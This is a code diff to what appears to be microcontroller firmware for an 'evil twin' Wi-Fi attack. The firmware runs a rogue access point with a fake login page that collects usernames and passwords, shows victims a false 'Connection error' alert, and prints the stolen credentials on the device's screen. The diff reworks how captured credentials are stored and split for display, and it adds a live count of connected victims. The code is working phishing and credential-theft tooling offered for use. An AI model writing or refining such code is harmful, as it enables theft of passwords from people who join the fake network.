@@ -139,15 +139,17 @@ void startEvilTwin() {
     }
   });
 
-  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
-    if (request->hasParam("username", true) && request->hasParam("password", true)) {
-      String username = request->getParam("username", true)->value();
-      String pass = request->getParam("password", true)->value();
-      
-      capturedCredentials = "User: " + username + "\nPass: " + pass;
-      request->send(200, "text/html", 
-        "<script>alert('Connection error. Try again.'); window.location.href='/';</script>");
-    }
+server.on("/login", HTTP_POST, [](AsyncWebServerRequest *request){
+  if (request->hasParam("username", true) && request->hasParam("password", true)) {
+        String username = request->getParam("username", true)->value();
+        String pass = request->getParam("password", true)->value();
+        
+        // Используем символ "|" как разделитель
+        capturedCredentials = username + "|" + pass;
+        
+        request->send(200, "text/html", 
+          "<script>alert('Connection error. Try again.'); window.location.href='/';</script>");
+      }
   });
 
   server.on("/.well-known/ios-redirect", HTTP_GET, [](AsyncWebServerRequest *request){
@@ -173,7 +175,6 @@ void stopEvilTwin() {
   WiFi.softAPdisconnect(true);
   drawMenu();
 }
-
 void displayEvilTwinStatus() {
   static unsigned long lastUpdate = 0;
   
@@ -186,14 +187,29 @@ void displayEvilTwinStatus() {
     display.setCursor(0, 0);
     
     display.println("EvilTwin Active");
-    display.println("SSID: " + String(ssid));
-    display.println("Clients: " + String(connectedClients));
-    display.println("IP: " + WiFi.softAPIP().toString());
+    display.println("Clients: " + String(WiFi.softAPgetStationNum()));
     display.println("----------------");
     
     if (capturedCredentials != "") {
-      display.println("Captured:");
-      display.println(capturedCredentials);
+      // Новый надежный метод обработки
+      String username = "";
+      String password = "";
+      
+      // Ищем разделитель между логином и паролем
+      int dividerPos = capturedCredentials.indexOf("|");
+      
+      if(dividerPos != -1) {
+        // Разделяем строку на две части
+        username = capturedCredentials.substring(0, dividerPos);
+        password = capturedCredentials.substring(dividerPos + 1);
+        
+        display.println("User: " + username);
+        display.println("Pass: " + password);
+      } else {
+        // Если разделитель не найден, выводим как есть
+        display.println("Received:");
+        display.println(capturedCredentials);
+      }
     } else {
       display.println("Waiting for data...");
     }
